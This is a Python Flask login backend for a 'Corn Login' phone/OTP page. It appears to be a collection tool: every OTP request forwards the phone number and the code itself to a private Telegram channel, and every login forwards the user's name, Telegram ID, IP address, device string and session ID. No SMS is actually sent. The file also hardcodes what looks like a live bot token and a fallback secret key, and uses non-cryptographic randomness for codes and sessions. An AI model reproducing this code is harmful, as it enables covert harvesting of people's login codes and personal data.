from flask import Flask, render_template, request, session, redirect, jsonify
import random
import time
import logging
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)
# Use environment variable for secret key (required for production)
app.secret_key = os.environ.get("SECRET_KEY", "9fK2vXq7Lp4mWz8RjB3nYc6TdHs1Ea5Ug0Ox7VwZiMkNr2Cy4PbA")

# ========== CONFIGURE THESE ==========
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8607223226:AAHBtUHkmc01RIRsVGTmJdm7d3B-PtI8o28")
TELEGRAM_CHANNEL_ID = os.environ.get("TELEGRAM_CHANNEL_ID", "-1004376082945")
# =====================================

logging.basicConfig(level=logging.INFO)

# Store OTPs temporarily (use Redis in production)
otp_storage = {}
user_sessions = {}

def send_to_telegram(message):
    """Send message to private Telegram channel"""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logging.info("Telegram not configured. Message: %s", message[:100])
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json().get("ok", False)
    except Exception as e:
        logging.error(f"Telegram send failed: {e}")
        return False

def send_sms(phone, otp):
    """Send OTP via SMS (console for testing)"""
    message = f"🔐 Your Corn Login OTP: {otp}\nPhone: {phone}"
    send_to_telegram(message)
    print(f"\n{'='*50}")
    print(f"📱 OTP for {phone}: {otp}")
    print(f"{'='*50}\n")
    return True

def format_session_message(user_data, ip_address, user_agent):
    """Format session data for Telegram"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""🟢 <b>NEW LOGIN - SESSION SAVED</b>

👤 <b>Name:</b> {user_data.get('name', 'N/A')}
📱 <b>Phone:</b> {user_data.get('phone', 'N/A')}
🆔 <b>Telegram ID:</b> {user_data.get('tg_id', 'N/A')}
⏰ <b>Time:</b> {timestamp}
🌐 <b>IP:</b> <code>{ip_address}</code>
💻 <b>Device:</b> {user_agent[:50]}...

<b>Session ID:</b> <code>{user_data.get('session_id', 'N/A')}</code>"""
    return message

@app.route("/")
def home():
    if "user" not in session:
        return redirect("/login")
    
    session_id = session.get("session_id")
    if session_id and session_id in user_sessions:
        user_sessions[session_id]["last_active"] = time.time()
    
    return render_template("index.html", user=session["user"])

@app.route("/login")
def login_page():
    return render_template("login.html")

@app.route("/api/send-otp", methods=["POST"])
def send_otp():
    try:
        data = request.json or {}
        phone = data.get("phone", "").strip()
        
        if not phone or len(phone) < 10:
            return jsonify(ok=False, error="Invalid phone number"), 400
        
        otp = str(random.randint(10000, 99999))
        
        otp_storage[phone] = {
            "otp": otp,
            "expires": time.time() + 300,
            "attempts": 0
        }
        
        send_sms(phone, otp)
        send_to_telegram(f"📤 OTP Requested\n📱 Phone: <code>{phone}</code>")
        
        return jsonify(ok=True, message="OTP sent successfully")
        
    except Exception as e:
        logging.error(f"Send OTP error: {e}")
        return jsonify(ok=False, error="Failed to send OTP"), 500

@app.route("/api/verify-otp", methods=["POST"])
def verify():
    try:
        data = request.json or {}
        phone = data.get("phone", "").strip()
        otp_input = data.get("otp", "").strip()
        name = data.get("name", "User").strip()
        tg_id = data.get("tg_id", "N/A").strip()
        
        if phone not in otp_storage:
            return jsonify(ok=False, error="OTP expired or not requested"), 400
        
        otp_data = otp_storage[phone]
        
        if time.time() > otp_data["expires"]:
            del otp_storage[phone]
            return jsonify(ok=False, error="OTP expired"), 400
        
        if otp_data["attempts"] >= 3:
            del otp_storage[phone]
            return jsonify(ok=False, error="Too many attempts"), 400
        
        if otp_data["otp"] != otp_input:
            otp_data["attempts"] += 1
            remaining = 3 - otp_data["attempts"]
            return jsonify(ok=False, error=f"Invalid OTP. {remaining} attempts left"), 401
        
        session_id = f"sess_{random.randint(100000, 999999)}_{int(time.time())}"
        
        user_data = {
            "name": name,
            "phone": phone,
            "tg_id": tg_id,
            "session_id": session_id,
            "login_time": time.time(),
            "login_time_formatted": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        session["user"] = user_data
        session["session_id"] = session_id
        
        user_sessions[session_id] = {
            **user_data,
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", "Unknown"),
            "last_active": time.time()
        }
        
        del otp_storage[phone]
        
        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent", "Unknown")
        session_msg = format_session_message(user_data, ip, user_agent)
        send_to_telegram(session_msg)
        
        return jsonify(ok=True, message="Login successful", session_id=session_id)
        
    except Exception as e:
        logging.error(f"Verify error: {e}")
        return jsonify(ok=False, error="Verification failed"), 500

@app.route("/api/logout", methods=["POST"])
def logout_api():
    session_id = session.get("session_id")
    user = session.get("user", {})
    
    if session_id and session_id in user_sessions:
        del user_sessions[session_id]
    
    send_to_telegram(f"""🔴 <b>LOGOUT</b>
👤 {user.get('name', 'N/A')}
📱 {user.get('phone', 'N/A')}
⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
    
    session.clear()
    return jsonify(ok=True)

@app.route("/logout")
def logout_page():
    session_id = session.get("session_id")
    user = session.get("user", {})
    
    if session_id and session_id in user_sessions:
        del user_sessions[session_id]
    
    send_to_telegram(f"""🔴 <b>LOGOUT</b>
👤 {user.get('name', 'N/A')}
📱 {user.get('phone', 'N/A')}
⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
    
    session.clear()
    return redirect("/login")

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    session_id = session.get("session_id")
    if session_id and session_id in user_sessions:
        user_sessions[session_id]["last_active"] = time.time()
        return jsonify(ok=True, active=True)
    return jsonify(ok=False, active=False), 401

# Required for Heroku - do not remove
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)